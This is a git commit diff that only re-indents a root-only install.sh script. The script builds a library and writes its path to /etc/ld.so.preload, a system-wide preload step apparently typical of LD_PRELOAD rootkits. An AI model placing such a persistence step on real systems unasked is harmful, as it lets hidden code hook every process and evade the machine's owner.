3c27786db347918cf9f0a0774c3f0795eace1b5e
Phizo <wfs225-dg@hotmail.com>
2014-07-23 02:09:22 +1000

    Update install.sh

--- install.sh
+++ install.sh
@@ -5,8 +5,8 @@ SUCCESS='\e[1m\e[32msuccessful\e[0m.'
 FAILED='\e[1m\e[31mfailed\e[0m.'
 
 if [ "$(id -u)" != '0' ]; then
-	echo 'You need to be root, ya dard.' 1>&2
-	exit 1
+    echo 'You need to be root, ya dard.' 1>&2
+    exit 1
 fi
 
 # I'm an eye-candy kinda guy...
@@ -19,9 +19,9 @@ make clean
 make
 
 if [ -f $OUTFILE ]; then
-	echo $OUTFILE > /etc/ld.so.preload
-	echo -e "[+] Installation $SUCCESS\n";
+    echo $OUTFILE > /etc/ld.so.preload
+    echo -e "[+] Installation $SUCCESS\n";
 else
-	echo "[+] ** $OUTFILE not found; cannot write to /etc/ld.so.preload. **\n" 1>&2;
-	echo -e "[+] Installation $FAILED\n";
+    echo "[+] ** $OUTFILE not found; cannot write to /etc/ld.so.preload. **\n" 1>&2;
+    echo -e "[+] Installation $FAILED\n";
 fi
